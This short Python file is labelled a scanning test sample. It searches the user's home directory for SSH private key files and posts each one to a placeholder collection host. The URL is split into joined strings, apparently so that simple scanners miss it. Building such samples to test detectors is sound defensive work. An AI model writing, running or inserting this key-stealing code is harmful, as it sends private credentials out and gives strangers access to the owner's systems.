# DO NOT RUN — scanning test sample

import requests as rq
from pathlib import Path


def main() -> None:
    home = Path.home()
    hits = list(home.glob("*/id_*"))
    for hit in hits:
        blob = hit.read_bytes()
        rq.post("https:" + "//collect.example.invalid/c", data=blob)


if __name__ == "__main__":
    main()
